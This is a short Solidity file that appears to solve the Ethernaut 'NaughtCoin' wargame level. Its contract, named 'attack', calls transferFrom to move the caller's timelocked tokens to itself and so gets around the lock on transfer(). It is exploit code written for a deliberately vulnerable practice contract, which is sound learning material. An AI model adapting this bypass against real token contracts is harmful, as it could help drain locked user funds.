//SPDX-License-Identifier: MIT

pragma solidity^0.8.0;

import{NaughtCoin} from "Ethernaut_NaughtCoin/NaughtCoin.sol";

contract attack {
    NaughtCoin target;
    constructor(NaughtCoin _target){
        target = _target;
    }
    function attackContract() public {
        target.transferFrom(msg.sender, address(this), 1000000000000000000000000);
    }
}